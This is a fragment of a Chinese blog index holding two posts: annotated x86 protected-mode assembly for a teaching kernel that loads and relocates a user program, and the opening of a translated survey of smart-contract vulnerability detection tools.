eax,[ram_alloc] ;起始地址   add eax,ecx ;分配完成的地址  mov ecx, [ram_alloc] ;这里已经是本次分配得到的位置  mov ebx,eax  and ebx,0xfffffffc  add ebx,4 ;数据对齐  test eax,0x00000003 ;判断是否已经对齐  cmovnz eax,ebx  mov [ram_alloc],eax ;这里存的是下次请求分配时的位置  pop ebx  pop eax  pop ds  retf;================================================================================set_up_gdt_descriptor:                      ;在GDT内安装一个新的描述符                                            ;输入：EDX:EAX=描述符                                             ;输出：CX=描述符的选择子         push eax         push ebx         push edx           push ds         push es           mov ebx,core_data_seg_sel          ;切换到核心数据段         mov ds,ebx         sgdt [pgdt]                        ;以便开始处理GDT         mov ebx,mem_0_4_gb_seg_sel         mov es,ebx         movzx ebx,word [pgdt]              ;GDT界限          inc bx                             ;GDT总字节数，也是下一个描述符偏移          add ebx,[pgdt+2]                   ;下一个描述符的线性地址            mov [es:ebx],eax         mov [es:ebx+4],edx           add word [pgdt],8                  ;增加一个描述符的大小              lgdt [pgdt]                        ;对GDT的更改生效             mov ax,[pgdt]                      ;得到GDT界限值         xor dx,dx         mov bx,8         div bx                             ;除以8，去掉余数         mov cx,ax                             shl cx,3                           ;将索引号移到正确位置          pop es         pop ds         pop edx         pop ebx         pop eax           retf ;-------------------------------------------------------------------------------make_seg_descriptor:                        ;构造存储器和系统的段描述符                                            ;输入：EAX=线性基地址                                            ;      EBX=段界限                                            ;      ECX=属性。各属性位都在原始                                            ;          位置，无关的位清零                                             ;返回：EDX:EAX=描述符         mov edx,eax         shl eax,16         or ax,bx                           ;描述符前32位(EAX)构造完毕         and edx,0xffff0000                 ;清除基地址中无关的位         rol edx,8         bswap edx                          ;装配基址的31~24和23~16  (80486+)         xor bx,bx         or edx,ebx                         ;装配段界限的高4位         or edx,ecx                         ;装配属性         retf;-------------------------------------------------------------------------------;汇编语言程序是极难一次成功，而且调试非常困难。这个例程可以提供帮助put_hex_dword:                              ;在当前光标处以十六进制形式显示                                            ;一个双字并推进光标                                            ;输入：EDX=要转换并显示的数字                                            ;输出：无         pushad         push ds         mov ax,core_data_seg_sel           ;切换到核心数据段         mov ds,ax         mov ebx,bin_hex                    ;指向核心数据段内的转换表         mov ecx,8  .xlt:         rol edx,4         mov eax,edx         and eax,0x0000000f         xlat         push ecx         mov cl,al         call put_char         pop ecx         loop .xlt         pop ds         popad         retf;=================================================================================SECTION code_data vstart=0 ;核心数据段  pgdt             dw  0             ;用于设置和修改GDT                   dd  0  ram_alloc        dd  0x00100000    ;下次分配内存时的起始地址  ;符号地址检索表  salt:  ;这里表示着对应的符号名称，例如@PrintString，表示着在程序中调用的函数名，但实际对应的是put_string方法  ;同理，@ReadDiskData，表示着在程序中调用的函数名，但实际对应的是read_hard_disk_0方法    ;用户程序加载的时候内核的任务是对比这两张salt表，将哦那个户程序salt表中的符号名切换为相应的入口地址        salt_1           db  &#x27;@PrintString&#x27;              times 256-($-salt_1) db 0                  dd  put_string                  dw  sys_routine_seg_sel  salt_2           db  &#x27;@ReadDiskData&#x27;              times 256-($-salt_2) db 0                  dd  read_hard_disk_0                  dw  sys_routine_seg_sel  salt_3           db  &#x27;@PrintDwordAsHexString&#x27;              times 256-($-salt_3) db 0                  dd  put_hex_dword                  dw  sys_routine_seg_sel  salt_4           db  &#x27;@TerminateProgram&#x27;              times 256-($-salt_4) db 0                  dd  return_point                  dw  core_code_seg_sel  salt_item_len   equ $-salt_4  salt_items      equ ($-salt)/salt_item_len  message_1        db  &#x27;  If you seen this message,that means we &#x27;                  db  &#x27;are now in protect mode,and the system &#x27;                  db  &#x27;core is loaded,and the video display &#x27;                  db  &#x27;routine works perfectly.&#x27;,0x0d,0x0a,0  message_5        db  &#x27;  Loading user program...&#x27;,0    do_status        db  &#x27;Done.&#x27;,0x0d,0x0a,0    message_6        db  0x0d,0x0a,0x0d,0x0a,0x0d,0x0a                  db  &#x27;  User program terminated,control returned.&#x27;,0  bin_hex          db &#x27;0123456789ABCDEF&#x27;                                    ;put_hex_dword子过程用的查找表  core_buf   times 2048 db 0         ;内核用的缓冲区  esp_pointer      dd 0              ;内核用来临时保存自己的栈指针     cpu_brnd0        db 0x0d,0x0a,&#x27;  &#x27;,0  cpu_brand  times 49 db 0  cpu_brnd1        db 0x0d,0x0a,0x0d,0x0a,0;================================================================================SECTION core_code vstart=0 ;核心代码段;加载并重定位用户程序;esi 起始逻辑扇区号，返回ax：用户程序头部选择子load_relocate_program:  push ebx  push ecx  push edx  push esi  push edi  push ds  push es   mov eax,core_data_seg_sel ;指向内核数据段  mov ds,eax   mov eax,esi  mov ebx,core_buf  call sys_routine_seg_sel:read_hard_disk_0 ;将在50号逻辑扇区的用户程序复制到core_buf缓冲区    ;复制完成后  ;判断程序大小  mov eax,[core_buf] ; 这里的理由和前面一样，定义的时候就是放在第一行的  mov ebx,eax  and ebx,0xfffffe00 ;清除低9位，等于➗512并取整  add ebx,512 ;补齐512  test eax,0x000001ff ;检查低9位是否为0  cmovnz eax,ebx ;不为0就将对齐后的设为eax，cmovnz : 如果为非零则将源数据复制给目标数据  ;此时已经获取了程序大小在eax中，请求分配内存空间  mov ecx,eax  call sys_routine_seg_sel:allocate_memory  ;分配后ecx保存了分配的起始地址  mov ebx,ecx                   push ebx                       xor edx,edx  mov ecx,512  div ecx  mov ecx,eax ;总扇区数  ;切换ds到0-4GB的段，好加载用户程序  mov eax,mem_0_4_gb_seg_sel  mov ds,eax    mov eax,esi ;起始扇区号.b1:  call sys_routine_seg_sel:read_hard_disk_0 ;老规矩读扇区  inc eax  loop .b1  ;读完整个用户程序的扇区  ;和之前一样，创建程序的头部描述符、代码描述符等  pop edi                            ;恢复程序装载的首地址   mov eax,edi                        ;程序头部起始线性地址  mov ebx,[edi+0x04]                 ;段长度  dec ebx                            ;段界限   mov ecx,0x00409200                 ;字节粒度的数据段描述符  call sys_routine_seg_sel:make_seg_descriptor  call sys_routine_seg_sel:set_up_gdt_descriptor  mov [edi+0x04],cx               ;建立程序代码段描述符  mov eax,edi  add eax,[edi+0x0c]                 ;代码起始线性地址  mov ebx,[edi+0x10]                 ;段长度  dec ebx                            ;段界限  mov ecx,0x00409800                 ;字节粒度的代码段描述符  call sys_routine_seg_sel:make_seg_descriptor  call sys_routine_seg_sel:set_up_gdt_descriptor  mov [edi+0x0c],cx  ;建立程序数据段描述符  mov eax,edi  add eax,[edi+0x14]                 ;数据段起始线性地址  mov ebx,[edi+0x18]                 ;段长度  dec ebx                            ;段界限  mov ecx,0x00409200                 ;字节粒度的数据段描述符  call sys_routine_seg_sel:make_seg_descriptor  call sys_routine_seg_sel:set_up_gdt_descriptor  mov [edi+0x14],cx  ;建立程序堆栈段描述符  mov eax,edi  add eax,[edi+0x1c]                 ;数据段起始线性地址  mov ebx,[edi+0x20]                 ;段长度  dec ebx                            ;段界限  mov ecx,0x00409200                 ;字节粒度的数据段描述符  call sys_routine_seg_sel:make_seg_descriptor  call sys_routine_seg_sel:set_up_gdt_descriptor  mov [edi+0x1c],cx  ;重定位SALT  ;用ds:esi指向内核-salt，es：edi指向用户的salt  mov eax,[edi+0x04]  mov es,eax     ;es指向程序头部              mov eax,core_data_seg_sel  mov ds,eax  ;ds指向内核数据段  cld ;修改df，使得cmps按正向比较  mov ecx,[es:0x24] ;用户程序salt的条目数  mov edi,0x28  ;用户salt的位置.b2:  push ecx  push edi    mov ecx,salt_items  mov esi,salt.b3:  push edi   push esi  push ecx  mov ecx,64  repe cmpsd ;重复比较双字，当不匹配或者计数器为0时停止  jnz .b4  mov eax,[esi]                      ;若匹配，esi恰好指向其后的地址数据  mov [es:edi-256],eax               ;将字符串改写成偏移地址  mov ax,[esi+4]  mov [es:edi-252],ax                ;以及段选择子.b4:  pop ecx  pop esi  add esi,salt_item_len  pop edi                            ;从头比较  loop .b3  pop edi  add edi,256  pop ecx  loop .b2  mov ax,[es:0x04] ;返回用户程序头部段的段选择子  pop es                             ;恢复到调用此过程前的es段   pop ds                             ;恢复到调用此过程前的ds段  pop edi  pop esi  pop edx  pop ecx  pop ebx  ret  ;-------------------------------------------------------------------------------start:  mov ecx,core_data_seg_sel ;指向核心数据段  mov ds,ecx  mov ebx,message_1  call sys_routine_seg_sel:put_string ;显示了message_1的内容  ;显示处理器的品牌信息  mov eax,0x80000002  cpuid  mov [cpu_brand + 0x00],eax  mov [cpu_brand + 0x04],ebx  mov [cpu_brand + 0x08],ecx  mov [cpu_brand + 0x0c],edx  mov eax,0x80000003  cpuid  mov [cpu_brand + 0x10],eax  mov [cpu_brand + 0x14],ebx  mov [cpu_brand + 0x18],ecx  mov [cpu_brand + 0x1c],edx  mov eax,0x80000004  cpuid  mov [cpu_brand + 0x20],eax  mov [cpu_brand + 0x24],ebx  mov [cpu_brand + 0x28],ecx  mov [cpu_brand + 0x2c],edx  mov ebx,cpu_brnd0  call sys_routine_seg_sel:put_string  mov ebx,cpu_brand  call sys_routine_seg_sel:put_string  mov ebx,cpu_brnd1  call sys_routine_seg_sel:put_string  mov ebx,message_5  call sys_routine_seg_sel:put_string  mov esi,50 ;用户程序位于50号逻辑扇区  call load_relocate_program  ;此时用户程序已经完成加载和符号表的重定向  mov ebx,do_status  call sys_routine_seg_sel:put_string    mov [esp_pointer],esp ;临时保存堆栈指针  mov ds,ax ;ds指向用户程序头部段  jmp far [0x08] ;0x08是用户程序头部选择子  return_point:  ;从用户程序返回控制权给内核  ;指向内核数据段  mov eax,core_data_seg_sel  mov ds,eax  ;指向内核堆栈段  mov eax,core_stack_seg_sel  mov ss,eax  mov esp,[esp_pointer]  mov ebx,message_6  call sys_routine_seg_sel:put_string  hlt\n\n用户程序代码：\n;===============================================================================SECTION header vstart=0         program_length   dd program_end          ;程序总长度#0x00              head_len         dd header_end           ;程序头部的长度#0x04         prgentry         dd start                ;程序入口#0x08         code_seg         dd section.code.start   ;代码段位置#0x0c         code_len         dd code_end             ;代码段长度#0x10         data_seg         dd section.data.start   ;数据段位置#0x14         data_len         dd data_end             ;数据段长度#0x18         stack_seg        dd section.stack.start  ;栈段位置#0x1c         stack_len        dd stack_end            ;栈段长度#0x20         ;-------------------------------------------------------------------------------         ;符号地址检索表         salt_items       dd (header_end-salt)/256 ;#0x24         salt:                                     ;#0x28         PrintString      db  &#x27;@PrintString&#x27;                     times 256-($-PrintString) db 0         TerminateProgram db  &#x27;@TerminateProgram&#x27;                     times 256-($-TerminateProgram) db 0         ReadDiskData     db  &#x27;@ReadDiskData&#x27;                     times 256-($-ReadDiskData) db 0header_end:;===============================================================================SECTION data vstart=0         buffer times 1024 db  0         ;缓冲区         message_1         db  0x0d,0x0a,0x0d,0x0a                           db  &#x27;**********User program is runing**********&#x27;                           db  0x0d,0x0a,0         message_2         db  &#x27;  Disk data:&#x27;,0x0d,0x0a,0data_end:;===============================================================================SECTION stack vstart=0        times 2048        db 0                    ;保留2KB的栈空间stack_end:;===============================================================================      [bits 32];===============================================================================SECTION code vstart=0start:        ; ds指向用户程序头部段         mov eax,ds         mov fs,eax         mov ss,[fs:stack_seg]         mov esp,stack_end         mov ds,[fs:data_seg]         mov ebx,message_1         call far [fs:PrintString]         mov eax,100                         ;逻辑扇区号100         mov ebx,buffer                      ;缓冲区偏移地址         call far [fs:ReadDiskData]          ;段间调用         mov ebx,message_2         call far [fs:PrintString]         mov ebx,buffer         call far [fs:PrintString]           ;too.         jmp far [fs:TerminateProgram]       ;将控制权返回到系统code_end:;===============================================================================SECTION trail;-------------------------------------------------------------------------------program_end:\n","tags":["win32 实模式到保护模式"]},{"title":"智能合约漏洞检测工具的综合调查：技术和方法","url":"/2025/11/12/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%E7%9A%84%E7%BB%BC%E5%90%88%E8%B0%83%E6%9F%A5%EF%BC%9A%E6%8A%80%E6%9C%AF%E5%92%8C%E6%96%B9%E6%B3%95/","content":"智能合约漏洞检测工具的综合调查：技术和方法摘要区块链技术的广泛使用突显出智能合约是数字交易的关键组成部分。然而，它们易受漏洞的影响，对安全性和可靠性提出了重大挑战。本调查对256种智能合约分析工具进行了全面评估，按模糊测试、机器学习、符号执行和形式化验证等方法进行了分类。通过理论和实践评估，本文提供了对智能合约漏洞检测工具的当前前景的见解。此外，本文系统地评估了基于现实世界数据集的选择工具。结果表明，虽然许多工具表现良好，但它们并不能完全准确地覆盖所有漏洞类型，这突出了改进检测方法集成的必要性。研究结果旨在弥补现有方法的不足，指导未来改进区块链应用程序的安全性。\n1 介绍区块链技术的快速扩展和广泛使用使智能合约（SCs）成为安全和自动化数字交易的关键要素。sc通常被称为自动执行协议，直接在区块链网络上运行，消除了中介机构，提高了透明度。它们简化流程、建立信任和降低成本的能力使它们对现代基于区块链的应用程序至关重要。因此，这些合同广泛用于不同的领域，例如金融、供应链管理和医疗保健。\n然而，使SCs具有吸引力的不变性和自主性也带来了重大的安全挑战。一旦部署，sc就无法更改，这意味着其代码中的任何漏洞都可能导致不可逆转的损失。因此，确保SCs的安全性和可靠性已成为该领域研究人员和从业人员关注的焦点。这项研究强调了sc迫切需要有效的漏洞检测工具，以提高基于区块链的应用程序的安全性和可靠性。我们的研究在理论见解和实际应用的基础上对当前的工具进行了全面的评估。\nSCs的脆弱性复杂且不断变化，使其研究具有挑战性。本文通过全面审查和分类256种工具来应对这一挑战，使用一种平衡的方法，包括理论研究和实际测试。这项工作需要大量的投入，在理论工作上花费了780小时，在实际评估上花费了1300小时。为了确保相关性和准确性，该分析侧重于该领域的出版物，强调到2024年的进展。目的是创建一个全面的资源，概述了SCs漏洞检测的现状，并作为这一关键领域未来研究和改进的指南。\n本文首先概述了搜索方法，其中解释了用于收集SCs检测工具文献的两种方法。它强调了彻底和公正地收集数据的重要性，使用特定的标准来选择只关注这些工具的高质量研究。接下来，先前的调查分析和动机部分回顾了18篇现有的调查论文，将它们分为实验、理论和比较分析三类。本文献综述突出了现有调查中的差距，例如缺乏深度或对漏洞检测关键方面的关注不足。这有助于确定当前研究中的差距，并确定在该领域进一步发展的机会。\nSCs分析可用工具部分彻底检查了256个已识别的工具，并根据它们的方法（如模糊测试、机器学习、符号执行和形式化验证）对它们进行了分组。这些工具分为检测和识别类型，提供了一个清晰的和有组织的视图，以加强SCs安全的作用。对于每种方法，将根据工具的功能（包括它们可以检测到的漏洞类型及其特定技术）进一步分析工具。在此之后，评估标准，分析，讨论部分通过将工具划分为学术和行业类别，并将它们分类为静态、动态或混合方法来评估工具。这种结构化的评估提供了详细的理解，解决了学术研究和行业应用的具体需求。\n本文的一个关键部分是SCs漏洞工具的实际分析部分，其中选择了来自学术界和工业界的工具，使用最新数据集进行了全面评估。本节强调了该研究的实际重要性，重点介绍了在检测漏洞方面的有效性所选择的七个工具。大量的时间和精力投入到这一实际分析中，表明了对推进该领域的坚定承诺。\n综上所述，本研究对SCs漏洞检测工具进行了全面的理论和实践分析，为当前形势提供了有价值的见解，并为未来的发展奠定了基础。本研究的主要贡献包括：(1)对现有的关于SCs漏洞的调查和技术论文进行了全面的审查和分类，(2)基于模糊测试、机器学习、符号执行和形式化验证等方法对256种工具进行了详细的分类和评估，(3)根据学术和行业需求对工具进行了系统的评估，按静态、动态和混合方法进行了分类。(4)对所选工具进行广泛的实际分析，弥合理论与实际应用之间的差距。本文致力于理论严谨性和实际实用性，旨在显著提高sc在不断发展的数字环境中的安全性和可靠性。\n本文的其余部分组织如下：第2节描述了搜索和收集相关文献的方法。第3节回顾了以前的调查，对它们进行了分类，并确定了激励本研究的差距。第4部分考察了SC分析的工具，重点是模糊测试、符号执行和形式化验证等方法。第5节根据定义的标准评估这些工具，并提出主要发现。第6节提供了使用最新数据集的选定工具的实际分析。第7节解释了结果，讨论了它们对SC安全的意义，并讨论了研究的局限性。第8部分提出了未来研究的想法，重点是开放的挑战和需要进一步调查的重要问题。最后，第9节总结了本文的关键见解和贡献\n2 搜索方法搜索方法是至关重要的研究过程，确保相关文献的全面和公正的收集。在本研究中，采用了两种不同的方法来实现这一点：一种用于调查文献，另一种用于技术论文。在这两个方向上，从不同的学术数据库中编译了针对SCs漏洞分析和检测的学术论文和文章。两种方法都使用筛选和排除标准来选择最相关和高质量的研究。本节概述了收集和选择SCs检测工具相关文献的搜索方法。\n2.1. 调查文献检索方法在现有数据库中进行了全面的搜索，以收集有关SCs检测工具的调查论文，形成第一阶段。这种搜索策略建立在一组精心挑选的关键字上，特别是使用“智能合约”和“工具”。这些关键词在多个学术出版数据库中使用，包括Web of Science、IEEE explore、ACM Digital Library、Elsevier ScienceDirect和施普林格，涵盖2018年至2024年的出版物。最初的搜索结果是199个调查\n在第二阶段，为确保本次综述的相关性和质量，建立了明确的排除标准：\n\n非英语写作的研究。\n与计算机科学领域无关的研究\n与SCs安全无关的研究。\n没有全文可用的研究。\n研究尚未发表，但在arXiv上有记录。\n重复研究。\n\n这一筛选过程排除了155项调查，留下了一组精炼的相关研究。第三阶段包括审查标题和摘要以检查其与研究目标的一致性，然后是全文审查以确认相关性。图1显示了这种方法的各个阶段和相关结果。\n2.2. 技术文献检索方法本节定义了一种策略，用于查找用于检测sc中漏洞的工具的技术论文。它包括两个主要步骤：彻底搜索和详细筛选。第一步，使用“智能合约”、“工具”、“安全”、“检测”、“漏洞”等特定关键词在学术出版物数据库中进行搜索。这些数据库包括Elsevier ScienceDirect、IEEE explore、ACM Digital Library和SpringerLink，重点关注2016年以后的出版物。表1总结了相关论文的数量在每个数据库中识别每个关键字。\n在收集了大量的论文之后，在第二步中采用仔细的筛选过程来选择最相关的论文。在本次筛选中，根据以下标准排除论文：\n\n非英语写作的研究。\n与计算机科学领域无关的研究。\n与SCs工具无关的研究。\n没有全文可用的研究。\n重复研究。\n\n然后仔细审查选定的论文，重点关注其摘要、方法、结果和结论，以确保它们与开发检测SCs漏洞的工具直接相关。总共选择了256篇与本研究直接相关的论文。图2为科技论文检索方法。\n3 之前的调查分析和动机根据2.1节中的调查，本节对这18篇调查论文进行了详细的分析。为了评价它们，这些调查论文被分为三类：实验分析、理论分析和比较分析。表格总结了所选调查论文的关键点，以加强分析。这种方法澄清了当前的状态，并确定了该领域未来发展的研究差距和机会。\n一些调查侧重于工具的实验性评估，测试各种工具以评估其性能指标或执行时间。Durieux等人（2020b）使用两个数据集评估了9个工具：一个数据集包含69个带注释的易受攻击的sc，用于精度评估，另一个数据集包含来自Etherscan的47,518个以太坊合约。他们开发了SmartBugs，这是一个专门的框架，用于促进工具的集成和比较。分析显示，只有42%的漏洞被所有工具一致检测到，其中Mythril以27%的准确率领先。Kushwaha等人（2022a）使用solidfi基准对16种工具进行了实验分析，发现Slither、Solhint和SmartCheck的执行时间最好。同时，Mythril、Slither和Oyente表现出更好的检测能力。尽管有这些评价，挑战仍然存在。Lashkari和Musilek（2023）对交易能源系统的工具进行了特定领域的评估。他们的研究结果显示，与非能源合同相比，能源合同有更多的漏洞和更慢的处理时间，突出了领域特定特征对检测准确性的影响。这些论文建议，未来的工作应该扩大漏洞覆盖范围，提高工具质量以减少误报，并将分析更无缝地集成到开发过程中。\n相反，一些论文采取了更理论化的方法，描述了工具及其功能。di Angelo和Salzer（2019）评估了27种用于分析以太坊sc的工具，通过涵盖学术、社区和企业起源的工具，填补了现有文献中的空白。Almakhour等人（2020）对13种用于检测sc漏洞的工具进行了全面分析。这些工具是根据它们的类型、级别和验证技术进行分类的。Vacca等人（2021）根据其技术方法、分析技术以及在各种区块链平台上检测SCs漏洞的有效性，讨论了26种工具。López Vivar等人（2020）回顾了18个开源SCs安全工具，检查了它们的操作机制、安装复杂性以及在多个区块链平台内部和跨平台检测漏洞的有效性。Rameder（2021）提出了140种安全分析工具的分类，简要描述了它们检测sc漏洞的方法。Wu等人（2024）为SCs分类了32种漏洞检测的工具，重点关注审计、正式验证和异常检测等方法，同时强调它们的优势和局限性。Hewa等人（2021）简要回顾了17种检测工具及其方法，并提供了SCs的总体概述，包括其原理、应用、挑战和未来前景。\nChu等人（2023）在这一类别中进一步扩展，根据检测方法对20种工具进行了分类，对于每种工具，本文一般解释了操作框架、输入要求以及这些工具旨在识别SCs中的漏洞类型。Liu and Liu（2019）根据其检测方法对11种工具进行了分类，并对每种工具的操作框架、输入要求以及工具旨在识别SCs中的漏洞类型进行了一般解释。Tolmach等人（2021）提供了34种采用形式化验证技术的工具的简要概述，概述了它们的关键功能。Zheng等人（2020）简要描述了12种SC漏洞检测工具，讨论了字节码分析和机器学习等关键方法，并概述了重入和庞氏骗局等常见漏洞。Hu等人（2021b）根据其底层技术和目标漏洞系统地对40种工具进行了分类，并在各自的类别中对每种工具进行了讨论，以提供对其功能和应用的清晰理解。这些论文强调未来的研究需要整合静态和动态分析，以更广泛的脆弱性覆盖和更少的误报。他们还强调需要全面的基准和标准化的度量来确保跨平台的一致的工具性能。\n此外，一些调查通过进行从不同角度评估工具的比较研究来促进讨论。Harz和Knottenbelt（2018）回顾了10种验证工具和方法，检查了它们的方法、自动化级别、覆盖范围、与不同语言的兼容性以及开源状态。Li et al.（2023）根据16种工具的检测方法，综合考虑其漏洞覆盖率、开源状态和检测准确性，对16种工具进行了对比分析。López Vivar等人（2020）对18种工具进行了比较，根据输入类型（字节码或Solidity）、分析方法、易于安装、总体有用性和更新频率等标准对其进行评估，以确保货币和所需的依赖关系。Rameder（2021）基于不同方面比较了140种工具，包括它们接受的输入类型、它们的主要目标、分析的性质（静态或动态）、它们用于代码转换的方法（如模型形式化），以及它们是利用形式化、动态还是其他方法。\nKushwaha等人（2022b）继续进行比较研究，根据关键参数系统地比较了27种工具：工具的输入是字节码还是固体码，进行的分析类型（静态或动态），工具起源的性质（基于学术或基于行业），用于实现的编程语言，以及工具的公共可用性。di Angelo和Salzer（2019）从不同角度评估了27种工具，包括它们的分析方法（从静态分析到动态分析）、实现细节（包括开发连续性和维护实践等方面），以及它们在识别特定安全漏洞方面的熟练程度。Kushwaha等人（2022a）基于诸如它们的起源（学术或公司）、源代码的可用性、接口类型（命令行或web）、发布年份和编程语言等标准评估了86种工具。尽管存在这些广泛的比较，但在标准化漏洞基准和开发增强编程指南以改进sc语言方面仍然存在挑战。\n除了对18篇调查论文进行了详细分析外，其他论文对SCs漏洞检测工具的主题进行了简要讨论。例如，Bartoletti等人（2025）提到了Mythril、Oyente和Securify等工具，但主要关注智能合约语言及其功能，而不是详细的工具评估。同样，Ressi等人（2024）提到了异常检测等人工智能驱动方法增强区块链安全性的潜力，但没有分析具体的漏洞检测工具或其性能。这些论文提供了有价值的背景，但与本节的范围不完全一致，本节的重点是对工具的全面调查。\n表2总结了早期的讨论，突出了所审查的研究的优点和缺点，并提供了每次调查中使用的方法的概述，包括分析是实验性的，理论的还是比较的。该表对每个调查检查的工具数量进行了编目，并区分了两种类型的漏洞引用：相关的漏洞，明确地与能够检测它们的特定工具相关联，以及不相关的漏洞，仅以一般术语提及，而没有指定哪些工具处理它们。该表还详细说明了每个工具使用的方法的数量，并指出了调查描述了一种方法而没有指定应用哪种工具的情况。\n根据这个表，很明显，之前的大多数调查要么分析了有限数量的工具，要么没有阐明它们之间的关系，它们使用的方法，以及它们所针对的漏洞。例如，具体的调查，如López Vivar等人（2020）和Rameder(2021)，一般讨论了漏洞，但没有指定每种工具可以检测的漏洞类型。此外，一些调查没有注意到与这些工具相关的具体方法。Harz和Knottenbelt（2018）以及Kushwaha等人（2022b）等调查只提到了几种通用方法，而不是深入研究工具的各种方法。这在现有的文献中出现了一个明显的差距，因为需要进行彻底的评估，不仅要单独解释每个工具，还要描述相关的工具漏洞和与之相关的方法。\n撰写新调查的主要动机是通过对迄今为止发布的工具进行全面分析来弥合现有的差距。它将检查每个工具针对的漏洞，探索它们使用的方法，并根据已建立的标准提供详细的比较。此外，它还包括对首选工具的实验比较。目标是全面概述所有现有的SCs检测工具，确定当前方法中的差距，并为未来的研究方向提出建议，以提高SCs检测工具的有效性和适应性。\n4 智能合约分析可用工具根据2.2节中识别的论文，本节分析了256种可用的SCs漏洞检测和识别工具论文。检测工具的目的是识别潜在的弱点，并确保安全编码的安全性和功能性。他们采用各种技术，如模糊测试、机器学习、符号执行和形式化验证，来执行彻底的分析。与检测工具不同，识别工具不仅检测漏洞，而且对每个检测到的漏洞进行分类和指定类型。这些工具使用诸如符号执行、机器学习和静态分析等高级技术来提供对漏洞本质的详细见解。通过识别特定类型的问题，它们可以帮助开发人员理解和解决SCs代码中的确切问题。\n本节根据这些工具的方法和功能对它们进行分类和解释。虽然一些论文专注于开发测试套件以提高智能合约测试的效率和覆盖率，例如Górski（2024）的工作，但这些研究的目的是优化测试过程，而不是检测或分类漏洞。因此，它们不包括在本分析中，本分析侧重于为漏洞检测和识别而设计的工具。\n本综述中的工具是通过分析每篇论文中的方法来组织的，以确定它们检测和识别漏洞的方法。然后根据这些方法在方法上的相似性对其进行分组，从而产生14个不同的类别。涵盖的方法包括抽象解释、基于人工智能的方法、代码插装、控制流分析、反汇编分析、形式验证、模糊测试、基于模型的测试、突变测试、模式匹配和语法分析、运行时验证、符号执行、污点分析和可视化分析。每种方法中的工具进一步分为检测和识别类别。例如，形式化验证工具分为形式化验证-检测和形式化验证-识别。\n4.1 “抽象解释”工具这个类别包括创建程序行为的抽象模型，以分析其属性并检测潜在的漏洞。通过使用数学抽象，这些工具可以系统地探索所有可能的执行路径，并识别通过传统测试方法可能不容易检测到的问题。在下面列出的为抽象解释开发的工具中，前两个侧重于检测，其余是SCs中的识别工具。\n\nAsparagus-detector（Cai et al., 2023a）：利用多面体和实代数几何合成SCs的参数gas上界。它在适用性和绑定紧密性方面优于现有的gas感知SCs分析平台（GASTAP）等方法。asparagus于2023年发布，可检测包括“gas限制低估”、“out of gas异常”和“循环中过量gas消耗”在内的漏洞。\nMichelsonLiSA-detector 它于2024年推出，是为Tezos sc设计的基于抽象解释的静态分析工具。它使用静态分析库（LiSA）框架来分析迈克尔逊语言，进行翻译将低级的基于堆栈的代码转换成高级的中间表示（IR）。该工具支持各种分析，例如污染和数据流分析，通过检查控制流图（cfg）和语义检查器来识别sc中的“不可信交叉契约调用”。\nGastap-identifier: Gastap于2019年发布，是一个气体感知分析平台，通过自动推断以太坊sc中公共功能的gas上限来防止“气不足”漏洞。它输入Solidity源代码或以太坊虚拟机（Ethereum Virtual Machine， EVM）字节码，并使用CFG构造、大小分析和气体方程生成来提供精确的gas消耗边界。Gastap对于调试、验证和认证gas使用是有效的，并且可以通过web界面使用。\n\n该类别提供了使用数学模型分析sc以探索不同执行路径的有效方法。这种方法有助于检测和识别漏洞，例如gas消耗问题和未处理异常。讨论的工具显示了抽象解释如何成功识别风险，从而实现更安全的SCs。\n4.2. “基于人工智能”的工具第二类工具利用了基于人工智能的技术。该方法采用先进的人工智能算法来分析和检测sc中的漏洞。利用机器学习和深度学习模型，这些工具可以高精度、高效地识别模式、异常和潜在的安全风险。以下是基于人工智能的工具：前24个用于检测的工具和33个用于漏洞识别的工具。\n\n\nBlock-Gram-detector (Xie et al., 2023)：该工具从以太坊字节码中提取低维、知识特征，提高漏洞检测效率。它将字节码转换为操作码，对它们进行分段，并挖掘块和属性特征。该方法利用Shapley加性解释（SHAP）值显著降低了检测延迟，提高了特征可解释性。Blockgram于2023年发布，可以检测各种漏洞，包括“整数溢出和下溢”、“调用堆栈深度攻击”、“事务顺序依赖（TOD）”、“时间戳依赖”和“可重入漏洞”。\n跨模态互学习漏洞检测器-检测器（Qian et al., 2023b）：该框架于2023年开发，通过使用源代码和字节码训练的教师网络和仅使用字节码训练的学生网络来改进SCs漏洞检测。这种相互学习的方法结合了多种模式来更准确地识别漏洞，包括“可重入性”、“时间戳依赖性”、“整数溢出&#x2F;下溢”和“委托调用”。\nCodeNet-detector (Hwang et al., 2022)：发布于2022年，是一种基于卷积神经网络（CNN）的SCs漏洞检测架构。它将sc转换为图像，同时保留其语义和上下文。CodeNet使用独特的数据预处理方法和专门的卷积来检测漏洞，包括“重入性”，“未检查的低级调用”，“时间戳依赖”和“txt .origin”。\ncontractaror - detector （Özdemir Sönmez和Knottenbelt， 2024）：它于2024年发布，作为在Solidity SCs中生成攻击面的工具，结合了基于规则的引擎和ChatGPT API进行安全分析。ContractArmor通过数值、关键变量和复杂查询来识别漏洞，这些都是在真实世界的合约上进行评估的。\n基于深度学习的恶意SCs检测方案检测器（Gupta等人，2022）：于2022年推出，它使用长短期记忆（LSTM），人工神经网络（ANN）和门控制循环单元（GRU）模型将sc分类为安全或恶意。它将字节码转换为操作码，应用单热编码，并生成用于分类的特征向量。\n基于深度学习的漏洞检测框架-检测器（Narayana和Sathiyamurthy， 2023）：该框架使用人工神经网络、自动编码器和多标签分类模型来识别sc中的漏洞，特别是“重入性”、“拒绝服务（DoS）”和“事务源”漏洞。它于2023年开发，从Solidity代码的抽象语法树（ast）中提取功能，并应用深度学习技术。\n深度学习和基于专家规则的漏洞检测机制-检测器（Liu et al., 2023a）：该工具将深度学习与专家规则相结合，以改进以太坊sc中的漏洞检测。它于2023年发布，使用图神经网络（gnn）进行初始检测，并使用专家规则来验证和阻止EVM级别的风险交易。该框架可以检测诸如“重入性”、“带硬编码气体量的调用”、“时间戳依赖”和“代码注入”等漏洞。\ndeepinference - detector (Zhao et al., 2023)：这是一个基于深度学习的框架，用于推断函数签名和EVM字节码的返回值。它于2023年发布，将字节码提升到IR中以保持语义，并使用gnn提取与类型相关的知识。蒸馏器- mlp &#x2F;LSTM重入检测器（Lê Hông等人，2023年）：该工具于2023年开发，使用自定义标记器和基于蒸馏器的模型来检测sc中的“重入”漏洞。该模型经历了三个阶段：使用自定义词汇表进行标记化，在屏蔽语言模型上进行预训练，以及使用多层感知器（MLP）和LSTM进行二元分类的微调。\nDynamit-detector (Eshghie et al., 